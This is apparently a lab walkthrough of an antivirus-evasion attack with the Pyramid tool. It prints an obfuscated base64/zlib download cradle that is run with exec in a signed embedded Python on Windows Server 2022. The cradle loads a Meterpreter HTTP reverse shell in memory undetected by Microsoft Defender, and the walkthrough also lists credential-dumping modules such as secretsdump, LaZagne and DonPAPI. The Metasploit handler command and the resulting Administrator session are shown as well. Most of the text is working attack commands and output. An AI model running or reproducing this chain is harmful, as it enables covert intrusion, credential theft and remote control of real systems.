+ - Basic Authentication
+ - encryption of delivered files (chacha, xor)
+ - URL decoding and decryption
+
+ Version: 0.1
+ Author: @naksyn
+
+[+] Auto-generating Pyramid config for modules and agents
+[+] Text between delimiters removed and replaced on file bh.py
+[+] Text between delimiters removed and replaced on file moduleshifting.py
+[+] Text between delimiters removed and replaced on file secretsdump.py
+[+] Text between delimiters removed and replaced on file pythonmemorymodule.py
+[+] Text between delimiters removed and replaced on file LaZagne.py
+[+] Text between delimiters removed and replaced on file clr.py
+[+] Text between delimiters removed and replaced on file tunnel-socks5.py
+[!] Delimiters not found in the file shellcode.py - might be OK if Pyramid config are not needed for it
+[+] Text between delimiters removed and replaced on file DonPAPI.py
+[+] Text between delimiters removed and replaced on file cradle.py
+[+] Text between delimiters removed and replaced on file cradle.py
+[+] printing b64encoded(zipped(cradle.py)) for scriptless execution on terminal:
+import base64
+import zlib
+encoded_script="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
+QVtXSfBj1n1vYiLNFPjErGf2jZ/wCm52S5"
+decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()
+exec(decoded_script)
+[+] Pyramid HTTP Server listening on port  443
+[+] MIND YOUR OPSEC! Serving Pyramid files from folder  /home/jeff/Documents/Tools/Pyramid-main/Server/
+[+] User allowed to fetch files:  testuser
+[+] HTTPS Server starting
+[+] Using SSL key  /home/jeff/Documents/Tools/Pyramid-main/Server/key.pem
+[+] Using SSL cert /home/jeff/Documents/Tools/Pyramid-main/Server/cert.pem
+/home/jeff/Documents/Tools/Pyramid-main/Server/pyramid.py:419: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
+  server.socket = ssl.wrap_socket(server.socket, keyfile=options.sslkey, certfile=options.sslcert, server_side=True)
+Enter PEM pass phrase:
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Use the signed Python binary (python-3.10.4-embed-amd64.zip) to download, decrypt and execute in-memory the pyhton module 'shellcode.py'
+         (which contains our Meterpreter HTTP reverse shell) on the Windows server 2022 without being detected by the Microsoft Defender AV 
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> .\python.exe
+Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 01:11:14) [MSC v.1929 64 bit (AMD64)] on win32
+>>>
+>>> 
+>>> import base64
+>>> import zlib
+>>> encoded_script="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"
+>>> decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()
+>>> exec(decoded_script)
+[*] HeapAlloc() Memory at: 1CFB5550000
+[*] Shellcode copied into memory.
+[*] CreateThread() in same process.
+
+
+Logs on the Pyramid HTTPs server
+=================================
+192.168.1.11 - - [29/Jul/2025 01:11:16] "GET /login/QfQY5UGzocZR78N3 HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: QfQY5UGzocZR78N3
+[+] Decrypted path: shellcode.py
+[+] Delivered encrypted file Modules/shellcode.py
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 5. The attack worked > On our Metasploit console we got a reverse shell from the Windows server 2022 without being detected by the MS Defender AV
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pyramid-main/Agent$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_http; 
+set LHOST 192.168.1.94; set LPORT 80; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; 
+set EnableStageEncoding true; set EnableUnicodeEncoding true;  run -j"
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View missing module options with show missing                                                                                                                                                    
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_http
+LHOST => 192.168.1.94
+LPORT => 80
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableStageEncoding => true
+EnableUnicodeEncoding => true
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTP reverse handler on http://192.168.1.94:80
+msf6 exploit(multi/handler) > 
+[*] http://192.168.1.94:80 handling request from 192.168.1.11; (UUID: fd5gx673) Redirecting stageless connection from /kw_Lzf7stwL2AvcAnor12QbrBHDrdZcMMqb
+IdY4mRgDwLpXbEP3hOO988PKdsnV8WolvrTQKKg1fXyrf4TZuqkK3Gdm7p with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] http://192.168.1.94:80 handling request from 192.168.1.11; (UUID: fd5gx673) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (192.168.1.94:80 -> 127.0.0.1 ) at 2025-07-29 01:12:28 +0200
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  1         meterpreter x64/windows  SERVER-WIN2022\Administrato  192.168.1.94:80 -> 127.0.0.
+                                     r @ SERVER-WIN2022           1  (192.168.1.11)
+
+msf6 exploit(multi/handler) > 
+
